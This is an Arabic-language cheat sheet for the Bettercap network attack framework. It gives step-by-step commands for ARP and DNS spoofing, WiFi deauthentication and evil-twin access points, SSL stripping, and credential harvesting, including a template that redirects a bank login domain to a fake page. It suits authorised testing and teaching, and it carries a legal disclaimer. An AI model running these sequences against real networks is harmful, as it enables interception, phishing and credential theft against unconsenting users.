<a id="-bettercap---network-attack-framework-cheatsheet"></a>
# 🦈 Bettercap - ورقة مرجعية لإطار هجمات الشبكات

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Swiss Army Knife for Network Attacks
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

يعرض الشعار اسم الأداة بوصفها مجموعة أدوات متعددة الاستخدامات لاختبار هجمات الشبكات.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Bettercap](#-what-is-bettercap)
- [التثبيت](#-installation)
- [الاستخدام الأساسي](#-basic-usage)
- [استطلاع الشبكة](#-network-reconnaissance)
- [انتحال ARP (هجوم الوسيط MITM)](#-arp-spoofing-mitm)
- [انتحال DNS](#-dns-spoofing)
- [هجمات WiFi](#-wifi-attacks)
- [خفض الاتصال من HTTPS](#-https-downgrade)
- [التقاط بيانات الاعتماد](#-credential-sniffing)
- [ملفات Caplets](#-caplets)
- [واجهة الويب](#-web-ui)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-bettercap"></a>
## 🎯 ما هو Bettercap

**Bettercap** أداة متعددة الاستخدامات لاختبار WiFi وBluetooth واستطلاع الشبكات. يقدم بديلا حديثا يواصل نهج ettercap مع المزايا التالية:

- 🔍 **استطلاع الشبكة** - اكتشاف الأجهزة المضيفة والخدمات
- 🎭 **هجمات الوسيط (MITM)** - انتحال ARP وDNS
- 📶 **هجمات WiFi** - إلغاء المصادقة، والتوأم الشرير، والتقاط المصافحة
- 🔓 **التقاط بيانات الاعتماد** - HTTP وHTTPS عبر خفض مستوى الاتصال
- 📡 **Bluetooth/BLE** - اكتشاف الأجهزة والهجمات عليها
- 🌐 **واجهة ويب** - واجهة رسومية واضحة

<a id="features"></a>
### المزايا

| الميزة | الوصف |
| --------- | ------------- |
| **بنية وحدات** | قابل للتوسعة باستخدام ملفات Caplets |
| **تفاعلي** | سطر أوامر تفاعلي يعمل في الوقت الفعلي |
| **قابل للأتمتة** | الأتمتة باستخدام ملفات Caplet |
| **واجهة ويب** | واجهة تعمل عبر المتصفح |
| **لغة Go** | سريع وحديث ومتعدد المنصات |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux-pre-installed"></a>
### Kali Linux (مثبت مسبقا)

```bash
# مثبت مسبقا في Kali
bettercap --help

# التحديث
sudo apt update && sudo apt install bettercap
```

<a id="debianubuntu"></a>
### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

<a id="from-source"></a>
### التثبيت من الشيفرة المصدرية

```bash
# تثبيت Go أولا
sudo apt install golang

# تثبيت bettercap
go install github.com/bettercap/bettercap@latest

# أو
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

<a id="install-ui-optional"></a>
### تثبيت الواجهة (اختياري)

```bash
# تنزيل واجهة الويب
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

<a id="-basic-usage"></a>
## 💻 الاستخدام الأساسي

<a id="start-bettercap"></a>
### بدء Bettercap

```bash
# البدء الأساسي (يتطلب صلاحيات root)
sudo bettercap

# تحديد واجهة الشبكة
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# الوضع غير التفاعلي (تنفيذ أوامر)
sudo bettercap -eval "net.probe on; net.show"

# تحميل ملف Caplet
sudo bettercap -caplet http-ui
```

<a id="interactive-shell"></a>
### سطر الأوامر التفاعلي

```bash
# داخل سطر أوامر bettercap
» help                      # عرض جميع الأوامر
» help net.probe            # مساعدة حول وحدة محددة
» net.show                  # عرض الأجهزة المضيفة المكتشفة
» set arp.spoof.targets X   # تعيين متغير
» arp.spoof on              # تفعيل الوحدة
» quit                      # خروج
```

<a id="module-management"></a>
### إدارة الوحدات

```bash
# عرض جميع الوحدات
» help

# الحصول على معلومات الوحدة
» help arp.spoof

# تفعيل الوحدة
» arp.spoof on

# تعطيل الوحدة
» arp.spoof off

# عرض إعدادات الوحدة
» get arp.spoof.*
```

---

<a id="-network-reconnaissance"></a>
## 🔍 استطلاع الشبكة

> **ملاحظة توافق:** ترسل `net.probe` حزم استكشاف، وليست وحدة استماع سلبي. لا تسرد الوثائق الحالية `net.probe.passive` أو `net.probe.timeout` ضمن معاملاتها؛ أبقيت أمثلة الأصل، فتحقق من دعم نسختك لها. [التوثيق الرسمي](https://www.bettercap.org/modules/ethernet/netprobe/).

<a id="host-discovery"></a>
### اكتشاف الأجهزة المضيفة

```bash
# تفعيل الاستكشاف النشط للشبكة
» net.probe on

# عرض الأجهزة المضيفة المكتشفة
» net.show

# المخرجات:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

يعرض مثال المخرجات عنوان IP وعنوان MAC والمصنّع ووقت آخر ظهور للجهاز. بقيت القيم والتسميات الأصلية للمقارنة.

<a id="network-info"></a>
### معلومات الشبكة

```bash
# عرض واجهة الشبكة الحالية
» net.show

# معلومات واجهة الشبكة
» get net.interface.*

# معلومات البوابة
» get gateway.*
```

<a id="probe-options"></a>
### خيارات الاستكشاف النشط

```bash
# تحديد الفاصل بين حزم الاستكشاف
» set net.probe.throttle 10

# الوضع السلبي (الاستماع فقط)
» set net.probe.passive true

# تحديد مهلة الاستكشاف
» set net.probe.timeout 500
```

<a id="recon-commands"></a>
### أوامر الاستطلاع

```bash
# استطلاع كامل
» net.recon on

# مسح الأجهزة المضيفة
» net.clear

# عرض الأجهزة النشطة فقط
» set net.show.meta true
» net.show

# التصدير إلى ملف
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

<a id="-arp-spoofing-mitm"></a>
## 🎭 انتحال ARP (هجوم الوسيط MITM)

<a id="basic-arp-spoof"></a>
### انتحال ARP الأساسي

```bash
# بدء bettercap
sudo bettercap -iface eth0

# تفعيل الاستكشاف النشط
» net.probe on

# الانتظار ثم عرض الأجهزة المضيفة
» net.show

# تحديد الهدف (الضحية)
» set arp.spoof.targets 192.168.1.100

# تفعيل انتحال ARP
» arp.spoof on

# أصبحت الآن في موضع الوسيط MITM!
```

<a id="full-duplex-both-directions"></a>
### ثنائي الاتجاه (Full Duplex)

```bash
# انتحال الجهاز المستهدف والبوابة معا
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

<a id="spoof-entire-subnet"></a>
### انتحال الشبكة الفرعية بأكملها

```bash
# استهداف جميع الأجهزة المضيفة باستثناء البوابة
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# داخليا فقط (دون انتحال البوابة)
» set arp.spoof.internal true
» arp.spoof on
```

<a id="arp-spoof--sniff"></a>
### انتحال ARP مع التقاط المرور

```bash
# إعداد متكامل لهجوم الوسيط
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

<a id="-dns-spoofing"></a>
## 🌐 انتحال DNS

<a id="basic-dns-spoof"></a>
### انتحال DNS الأساسي

```bash
# تحديد نطاقات انتحال DNS
» set dns.spoof.domains example.com, *.example.com

# تحديد عنوان إعادة التوجيه (جهازك)
» set dns.spoof.address 192.168.1.50

# التفعيل (يتطلب انتحال ARP)
» arp.spoof on
» dns.spoof on
```

<a id="spoof-all-domains"></a>
### انتحال جميع النطاقات

```bash
# محرف بديل لإعادة توجيه جميع النطاقات
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

<a id="multiple-domains"></a>
### نطاقات متعددة

```bash
# قائمة النطاقات
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

<a id="dns-spoof-with-http-server"></a>
### انتحال DNS مع خادم HTTP

```bash
# إعداد تصيد متكامل
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# بدء خادم HTTP على جهازك
» set http.server.path /var/www/phishing
» http.server on
```

---

<a id="-wifi-attacks"></a>
## 📶 هجمات WiFi

<a id="enable-wifi-mode"></a>
### تفعيل وضع WiFi

```bash
# البدء باستخدام واجهة WiFi
sudo bettercap -iface wlan0

# تفعيل استطلاع WiFi
» wifi.recon on

# عرض نقاط الوصول المكتشفة
» wifi.show
```

<a id="wifi-reconnaissance"></a>
### استطلاع WiFi

```bash
# عرض جميع نقاط الوصول
» wifi.show

# المخرجات:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

يسرد المثال قوة الإشارة RSSI، وعنوان نقطة الوصول BSSID، والقناة، والتشفير، واسم الشبكة ESSID، وعدد العملاء.

<a id="deauthentication-attack"></a>
### هجوم إلغاء المصادقة (Deauthentication)

```bash
# إلغاء مصادقة جميع عملاء نقطة وصول محددة
» wifi.deauth AA:BB:CC:DD:EE:FF

# إلغاء مصادقة عميل محدد
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# إلغاء المصادقة بصورة متكررة
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

<a id="handshake-capture"></a>
### التقاط المصافحة (Handshake)

> **توضيح:** تتطلب وظائف WiFi واجهة تدعم وضع المراقبة وحقن الحزم. في الوثائق الحالية، `wifi.handshakes.file` مسار ملف PCAP افتراضيا، ويتأثر سلوك التجميع بـ `wifi.handshakes.aggregate`؛ فلا تفترض أن مسار المجلد في الأصل صالح في كل إصدار. [توثيق WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# تفعيل استطلاع WiFi
» wifi.recon on

# تحديد القناة (القناة نفسها المستخدمة لدى الهدف)
» wifi.recon.channel 6

# التقاط المصافحات
» set wifi.handshakes.file /tmp/handshakes/

# إلغاء المصادقة لفرض إعادة الاتصال
» wifi.deauth AA:BB:CC:DD:EE:FF

# فحص المصافحات الملتقطة
» wifi.show.wpa
```

<a id="evil-twin-attack"></a>
### هجوم التوأم الشرير (Evil Twin)

> **توضيح للمثال:** تصف الوثائق `wifi.ap` بأنه يحقن إطارات إعلان إدارة مزيفة ويتطلب تشغيل `wifi.recon`؛ لا يعني الإعلان وحده توفير نقطة وصول مكتملة تقبل اتصالات العملاء. احتفظت بصيغة الأصل، وقارنها [بصيغة الوحدة الرسمية](https://www.bettercap.org/modules/wifi/).

```bash
# استنساخ نقطة الوصول
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# بدء نقطة الوصول المزيفة
» wifi.ap on

# إلغاء مصادقة عملاء نقطة الوصول الأصلية لدفعهم إلى الاتصال
» wifi.deauth <real_AP_BSSID>
```

<a id="pmkid-attack"></a>
### هجوم PMKID

```bash
# هجوم حديث لا يتطلب عميلا متصلا
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# حفظ PMKID الملتقط في مجلد المصافحات
» wifi.show.wpa
```

---

<a id="-https-downgrade"></a>
## 🔒 خفض الاتصال من HTTPS

<a id="ssl-strip-hsts-bypass"></a>
### إزالة SSL ‏(تجاوز HSTS)

> **تصحيح:** عنوان الأصل لا يعني أن SSL stripping يتجاوز HSTS عموما؛ يفرض المتصفح HTTPS عندما تكون سياسة HSTS سارية لديه. ويحتاج اعتراض HTTPS إلى قبول العميل شهادة الوسيط: تعيد الأداة توقيع الشهادات بسلطتها الخاصة، فتظل ثقة العميل بالشهادة شرطا. راجع [سلوك HSTS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security) و[توثيق وسيط HTTPS](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).

```bash
# تفعيل انتحال ARP أولا
» arp.spoof on

# تفعيل إزالة SSL
» set https.proxy.sslstrip true
» https.proxy on

# أو استخدام وسيط HTTP
» http.proxy on
```

<a id="https-proxy"></a>
### وسيط HTTPS

```bash
# إعداد وسيط HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# باستخدام شهادة
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

<a id="capture-https-traffic"></a>
### التقاط مرور HTTPS

```bash
# هجوم وسيط متكامل مع HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

<a id="-credential-sniffing"></a>
## 🔓 التقاط بيانات الاعتماد

<a id="http-credentials"></a>
### بيانات اعتماد HTTP

```bash
# تفعيل التقاط المرور
» net.sniff on

# تفعيل التقاط المرور المحلي
» set net.sniff.local true
» net.sniff on

# ترشيح HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

<a id="credential-harvesting"></a>
### جمع بيانات الاعتماد

```bash
# التقاط متكامل لبيانات الاعتماد
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# تظهر بيانات الاعتماد في الوقت الفعلي
```

<a id="save-to-file"></a>
### الحفظ في ملف

```bash
# حفظ الحزم الملتقطة
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# مخرجات تفصيلية
» set net.sniff.verbose true
» net.sniff on
```

---

<a id="-caplets"></a>
## 📜 ملفات Caplets

<a id="what-are-caplets"></a>
### ما هي ملفات Caplets؟

ملفات Caplets هي سكربتات بامتداد (.cap) تستخدم لأتمتة أوامر bettercap.

<a id="built-in-caplets"></a>
### ملفات Caplets المضمنة

```bash
# عرض ملفات Caplets
» caplets.show

# ملفات Caplets الشائعة:
- http-ui       # واجهة ويب
- https-ui      # واجهة ويب آمنة
- local-sniffer # التقاط المرور المحلي
- mitm          # إعداد أساسي لهجوم الوسيط
- pita          # أتمتة هجمات WiFi
```

<a id="load-caplet"></a>
### تحميل ملف Caplet

```bash
# من سطر الأوامر
sudo bettercap -caplet http-ui

# داخل bettercap
» caplet http-ui

# من ملف
sudo bettercap -caplet /path/to/custom.cap
```

<a id="create-custom-caplet"></a>
### إنشاء ملف Caplet مخصص

```bash
# الملف: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# تشغيل ملف Caplet مخصص
sudo bettercap -caplet my-mitm.cap
```

<a id="update-caplets"></a>
### تحديث ملفات Caplets

```bash
# تحديث جميع ملفات Caplets
» caplets.update
```

---

<a id="-web-ui"></a>
## 🌐 واجهة الويب

<a id="start-web-ui"></a>
### بدء واجهة الويب

> **ملاحظة للإصدارات:** تستخدم الوثائق الحالية وحدة الواجهة `ui`؛ أمثلة الأصل تعتمد ملفات Caplets أقدم. في `http-ui.cap` الرسمي يستمع خادم الواجهة عبر HTTP على المنفذ 80، وREST API على 8081، وتخص بيانات `user/pass` إعدادات `api.rest`؛ لذا لا يعمم عنوان HTTPS والمنفذ 8080 أدناه، ولا تضبط معاملات `http.server` وحدها اعتماد API. [وثائق الواجهة](https://www.bettercap.org/usage/web_ui/) و[ملف Caplet الرسمي](https://github.com/bettercap/caplets/blob/master/http-ui.cap).

```bash
# تثبيت الواجهة أولا
sudo bettercap -eval "caplets.update; ui.update; quit"

# البدء بواجهة الويب (HTTP)
sudo bettercap -caplet http-ui

# البدء بواجهة HTTPS
sudo bettercap -caplet https-ui

# الوصول: https://127.0.0.1:8080/
# بيانات الاعتماد الافتراضية: user/pass
```

<a id="web-ui-features"></a>
### مزايا واجهة الويب

| الميزة | الوصف |
| --------- | ------------- |
| **لوحة التحكم (Dashboard)** | عرض الشبكة في الوقت الفعلي |
| **الأجهزة المضيفة (Hosts)** | الأجهزة المكتشفة |
| **WiFi** | الشبكات اللاسلكية |
| **BLE** | أجهزة Bluetooth |
| **الأحداث (Events)** | سجل النشاط |
| **الحزم (Packets)** | مرور الشبكة الملتقط |

<a id="configure-web-ui"></a>
### إعداد واجهة الويب

```bash
# تعيين بيانات الاعتماد
» set http.server.username admin
» set http.server.password secretpass

# تحديد المنفذ
» set http.server.port 8080

# عنوان الاستماع
» set http.server.address 0.0.0.0
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### أوامر أساسية

| الأمر | الوصف |
| --------- | ------------- |
| `net.probe on` | بدء اكتشاف الأجهزة المضيفة |
| `net.show` | عرض الأجهزة المضيفة المكتشفة |
| `arp.spoof on` | تفعيل انتحال ARP |
| `net.sniff on` | بدء التقاط الحزم |
| `dns.spoof on` | تفعيل انتحال DNS |
| `wifi.recon on` | بدء فحص WiFi |
| `wifi.deauth BSSID` | هجوم إلغاء المصادقة |
| `https.proxy on` | تفعيل وسيط HTTPS |

<a id="common-variables"></a>
### متغيرات شائعة

| المتغير | الوصف |
| ---------- | ------------- |
| `arp.spoof.targets` | الأجهزة المستهدفة بهجوم الوسيط |
| `arp.spoof.fullduplex` | الانتحال في كلا الاتجاهين |
| `dns.spoof.domains` | النطاقات المراد انتحالها |
| `dns.spoof.address` | عنوان IP لإعادة التوجيه |
| `net.sniff.output` | ملف مخرجات PCAP |
| `wifi.ap.ssid` | اسم نقطة الوصول المزيفة |

<a id="mitm-attack-template"></a>
### قالب هجوم الوسيط MITM

```bash
# هجوم وسيط أساسي
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

<a id="wifi-attack-template"></a>
### قالب هجوم WiFi

```bash
# إلغاء مصادقة WiFi مع التقاط المرور
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

<a id="complete-phishing-attack"></a>
### هجوم تصيد متكامل

```bash
# انتحال DNS مع موقع مزيف
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ إخلاء مسؤولية قانوني

```
⚠️ تحذير: Bettercap أداة قوية تستطيع اعتراض
مرور الشبكة. استخدمها فقط على شبكات تملكها أو لديك
إذن كتابي صريح لاختبارها.

✅ اختبار اختراق مصرح به
✅ أبحاث أمنية (في بيئة مختبر)
✅ أغراض تعليمية

❌ الاعتراض غير المصرح به غير قانوني
❌ لا تستخدمها على الشبكات العامة
❌ لا تسرق بيانات الاعتماد
```

---

<a id="-resources"></a>
## 📚 المصادر

- [موقع Bettercap الرسمي](https://www.bettercap.org/)
- [مستودع Bettercap على GitHub](https://github.com/bettercap/bettercap)
- [توثيق Bettercap](https://www.bettercap.org/modules/)
- [ملفات Caplets](https://github.com/bettercap/caplets)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [Aircrack-ng](../../Aircrack-ng/translations/README.ar.md)
- [Wifite](../../Wifite/translations/README.ar.md)
- [Wireshark](../../Wireshark/translations/README.ar.md)

---

<p align="center">
  <b>🦈 أتقن هجمات الشبكات!</b><br>
  <i>Bettercap - أداة متعددة الاستخدامات لاختبار اختراق الشبكات</i>
</p>
